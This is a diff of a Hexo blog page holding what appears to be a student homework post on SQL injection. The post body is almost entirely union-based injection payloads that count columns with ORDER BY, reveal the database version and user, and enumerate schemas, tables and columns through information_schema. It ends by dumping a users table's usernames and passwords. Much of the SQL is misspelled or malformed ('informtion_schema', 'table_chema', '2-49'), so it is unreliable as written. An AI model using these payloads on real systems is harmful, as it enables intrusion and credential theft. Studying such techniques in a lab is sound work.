@@ -15,7 +15,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="通过拼接sql语句，最终查询出网站中所有的库名，所有的表名，所有的字段名，所有的字段内容！写出过程">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-08-14T07:01:00.425Z">
+<meta property="og:updated_time" content="2019-08-28T15:29:56.816Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="20198013作业">
 <meta name="twitter:description" content="通过拼接sql语句，最终查询出网站中所有的库名，所有的表名，所有的字段名，所有的字段内容！写出过程">
@@ -167,7 +167,7 @@
 
         
         <a href="/2019/08/13/20198013zuoye/" class="archive-article-date">
-  	<time datetime="2019-08-13T14:30:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-13</time>
+  	<time datetime="2019-08-13T19:30:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-13</time>
 </a>
         
       </header>
@@ -176,7 +176,7 @@
       
         <p>通过拼接sql语句，最终查询出网站中所有的库名，所有的表名，所有的字段名，所有的字段内容！写出过程</p>
 <a id="more"></a>
-<p>查询有多少列<br>order b<br>order by50 25 40 45二分法<br>and 1=2 union select version(), database(),  user() ,  4-49;<br>显示                 版本号    , 当前数据库 ,  用户名<br>and 1=2 union select (select group_concat( schema_name) from inforation schema,schemata),2,-49;<br>查出所有库的名字<br>and 1=2 union select (select group concat(table_name) from inforation schema, tables where table_chema = ‘test’),2,-49;<br>查出所有表的名字<br>and 1=2 union select (select group concat(column_name)from inforation schema,columns where table_chema =’test and table_name=’users’)2-49<br>查出所有列的名字<br>test users id, username, password, ip, email, time<br>and 1=2 union select (select group concat(id, 0x7e,username,0x7e, password, 0x7e, ip, 0x7e, email, 0x7e, time) from  test users), 2-49;</p>
+<p>查询有多少列<br>order b<br>order by50 25 40 45二分法<br>and 1=2 union select version(), database(),  user() ,  4-49;<br>显示                 版本号    , 当前数据库 ,  用户名<br>and 1=2 union select (select group_concat( schema_name) from informtion_schema.schemata),2,-49;<br>查出所有库的名字<br>and 1=2 union select (select group_concat(table_name) from informtion_schema.tables where table_chema = ‘test’),2-49;<br>查出所有表的名字<br>and 1=2 union select (select group_concat(column_name)from informtion_schema.columns where table_chema =’test’ and table_name=’users’)2-49<br>查出所有列的名字<br>test users id, username, password, ip, email, time<br>and 1=2 union select (select group_concat(id, 0x7e,username,0x7e, password, 0x7e, ip, 0x7e, email, 0x7e, time) from  test users), 2-49;</p>
 <!-- more -->
       
 
@@ -269,6 +269,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2019/09/05/wjx/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
   
   
     <a href="/2019/08/13/xinwen2/" id="article-nav-older" class="article-nav-link-wrap">
